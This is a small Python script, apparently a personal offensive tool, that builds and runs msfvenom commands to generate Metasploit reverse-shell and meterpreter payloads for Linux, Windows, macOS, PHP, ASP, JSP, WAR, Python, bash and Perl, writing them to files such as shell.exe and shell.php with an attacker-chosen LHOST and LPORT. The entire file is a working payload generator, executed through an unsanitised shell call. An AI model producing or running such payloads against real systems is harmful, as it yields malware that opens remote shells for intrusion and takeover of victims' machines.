import os
from subprocess import PIPE, run
def command(cmd):
	return run(cmd, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

payloads={
	"linux":"msfvenom -p linux/x86/meterpreter/reverse_tcp",
	"windows": "msfvenom -p windows/meterpreter/reverse_tcp ",
	"mac":"msfvenom -p osx/x86/shell_reverse_tcp LHOST=ip_address ",
	"php" : "msfvenom -p php/meterpreter_reverse_tcp ",
	"asp" : "msfvenom -p windows/meterpreter/reverse_tcp ",
	"jsp" : "msfvenom -p java/jsp_shell_reverse_tcp ",
	"war" : "msfvenom -p java/jsp_shell_reverse_tcp ",
	"python" : "msfvenom -p cmd/unix/reverse_python ",
	"bash" : "msfvenom -p cmd/unix/reverse_bash ",
	"perl" : "msfvenom -p cmd/unix/reverse_perl ",

}

extentions={
	"linux" : " -f elf > shell.elf",
	"windows" : " -f exe > shell.exe",
	"mac" : " -f macho > shell.macho",
	"php" : " -f raw > shell.php",
	"asp" : " -f asp > shell.asp",
	"jsp" : " -f raw > shell.jsp",
	"war" : " -f war > shell.war",
	"python" : " -f raw > shell.py",
	"bash" : " -f raw > shell.sh",
	"perl" : " -f raw > shell.pl",

}

def payloads_msf(a):
	if "--payload" in a:
		data=payloads[a[2]]
		
		host=" LHOST="+str(a[3])
		port=" LPORT="+str(a[4])
		
		
		print(data+host+port+extentions[a[2]])
		command(data+host+port+extentions[a[2]])
# a=input("Enter Your Command: ").split()
# payloads_msf(a)
